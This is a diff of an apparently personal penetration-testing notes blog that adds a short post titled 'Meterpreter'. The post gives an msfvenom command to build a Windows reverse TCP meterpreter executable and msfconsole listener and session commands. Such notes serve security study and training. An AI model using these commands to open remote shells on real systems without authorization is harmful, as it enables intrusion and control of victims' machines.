@@ -52,83 +52,65 @@
       </header>
 
       <main>
-        <div id="home">
-  <ul class="posts">
-    
-    <li itemscope itemtype="http://schema.org/BlogPosting">
-      <a href="/undem.github.io/2020/05/23/rdesktop/" itemprop="url">
-        <div class="p-wrap">
-          <article class="inner">
-            <time datetime="2020-05-23T10:00:00+00:00"
-                itemprop="datePublished">
-              23 May 2020
-            </time>
-            <p itemprop="name headline">rdesktop</p>
-          </article>
-        </div>
-      </a>
-    </li>
-    
-    <li itemscope itemtype="http://schema.org/BlogPosting">
-      <a href="/undem.github.io/2020/05/23/meterpreter/" itemprop="url">
-        <div class="p-wrap">
-          <article class="inner">
-            <time datetime="2020-05-23T10:00:00+00:00"
-                itemprop="datePublished">
-              23 May 2020
-            </time>
-            <p itemprop="name headline">Meterpreter</p>
-          </article>
-        </div>
-      </a>
-    </li>
-    
-    <li itemscope itemtype="http://schema.org/BlogPosting">
-      <a href="/undem.github.io/2020/05/23/windows-privesc/" itemprop="url">
-        <div class="p-wrap">
-          <article class="inner">
-            <time datetime="2020-05-23T10:00:00+00:00"
-                itemprop="datePublished">
-              23 May 2020
-            </time>
-            <p itemprop="name headline">Windows PrivEsc</p>
-          </article>
-        </div>
-      </a>
-    </li>
-    
-    <li itemscope itemtype="http://schema.org/BlogPosting">
-      <a href="/undem.github.io/2020/05/03/vulnuniversity/" itemprop="url">
-        <div class="p-wrap">
-          <article class="inner">
-            <time datetime="2020-05-03T16:57:51+00:00"
-                itemprop="datePublished">
-              03 May 2020
-            </time>
-            <p itemprop="name headline">VulnUniversity</p>
-          </article>
-        </div>
-      </a>
-    </li>
-    
-    <li itemscope itemtype="http://schema.org/BlogPosting">
-      <a href="/undem.github.io/2020/05/03/nmap/" itemprop="url">
-        <div class="p-wrap">
-          <article class="inner">
-            <time datetime="2020-05-03T10:00:00+00:00"
-                itemprop="datePublished">
-              03 May 2020
-            </time>
-            <p itemprop="name headline">Nmap</p>
-          </article>
-        </div>
-      </a>
-    </li>
-    
-  </ul>
-</div>
+        <section class="single-wrap">
+  <article class="single-content" itemscope itemtype="http://schema.org/BlogPosting">
+    <div class="feat">
+      <h5 class="page-date">
+        <time datetime="2020-05-23T10:00:00+00:00" itemprop="datePublished">
+          23 May 2020
+        </time>
+      </h5>
+    </div>
+    <h1 class="page-title" itemprop="name headline">Meterpreter</h1>
+    <div itemprop="articleBody">
+      <h1 id="set-up-reverse-tcp-shell">Set up reverse TCP shell</h1>
+
+<p>To set up the reverse shell:</p>
+<ul>
+  <li>You need to create your program which will be executed on the target</li>
+  <li>You need to launch a listener, awaiting for the connection (from your program)</li>
+</ul>
+
+<p>To generate your program</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=[</span>your IP] <span class="nt">-f</span> exe|msi|... <span class="nt">-o</span> name.exe|msi|...</code></pre></figure>
+
+<p>You need to specify your IP and not the target IP since your program will try to connect with your machine.</p>
+
+<p>To launch the listener</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfconsole
+use multi/handler
+<span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+<span class="nb">set </span>lhost <span class="o">[</span>your IP]
+<span class="nb">set </span>lport <span class="o">[</span>default 4444] | <span class="nb">unset </span>lport
+run</code></pre></figure>
+
+<p>Once the program is executed, you will see a session meterpreter.
+You can have multiple sessions:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"> sessions <span class="nt">-i</span> ID_meterpreter_session <span class="o">(</span>on msfconsole, not meterpreter session<span class="o">)</span>
+ sessions <span class="nt">-h</span></code></pre></figure>
 
 
+    </div>
+    <div class="feat share">
+      <a href="http://twitter.com/share" class="popup">
+        <span class="icon-twitter"></span>
+      </a>
+    </div>
+    
+      <a rel="next" href="/undem.github.io/2020/05/23/rdesktop/" id="next">
+        <span class="nav-title nav-title-next">newer</span> &rarr;
+      </a>
+    
+    
+      <a rel="prev" href="/undem.github.io/2020/05/23/windows-privesc/" id="prev">
+        &larr; <span class="nav-title nav-title-prev">older</span>
+      </a>
+    
+  </article>
+</section>
 
       </main>
 
